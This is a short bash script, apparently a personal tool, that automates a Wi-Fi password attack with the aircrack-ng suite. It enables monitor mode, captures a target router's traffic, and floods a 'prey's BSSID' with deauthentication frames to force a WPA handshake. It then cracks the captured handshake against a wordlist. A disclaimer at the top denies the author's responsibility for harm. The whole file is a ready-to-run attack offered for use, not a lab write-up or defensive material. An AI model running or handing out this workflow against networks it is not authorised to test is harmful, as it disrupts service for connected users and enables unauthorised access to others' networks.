echo  "Hey this is an Application created by Reflex_Gravity
      ----------------------------------------------------
      Any harm due to this Application is not subjected to be under the creator or the developer or any of his family member"

echo -e "---Select the option accordingly--- \n
           1. Setting the monitor and dumping signals \n
           2. Capture the packets           "

read choice

if [ $choice -eq '1' ];
then
airmon-ng check kill

airmon-ng start wlan0mon

echo "Enter the monitor name =>"
read monname

airmon-ng start $monname

echo "---Press Ctrl+C after noting the bssid and channel---"
sleep 3
airodump-ng $monname

echo "Enter the BSSID =>"
read bssid

echo "Enter the channel of the Router =>"
read chan

echo "Enter the destination and name of the file to write =>"
read filename

echo -e "------------------\n|Check here for handshake|\n|Open a new tab and run this file and select option 2.|\n|-------------------|"
sleep 4
sudo airodump-ng --bssid $bssid -c $chan -w $filename $monname

else

echo "Enter prey's BSSID =>"
read bssid

echo "Enter monitor name =>"
read monname
  
echo "---Press Ctrl+C after the handshake---\n \n"

sleep 2
sudo aireplay-ng -0 50 -a $bssid $monname

echo "Enter path of .cap file =>"
read capfile

echo "Enter path of wordlist"
read wrdlist

sudo aircrack-ng $capfile -w $wrdlist 

fi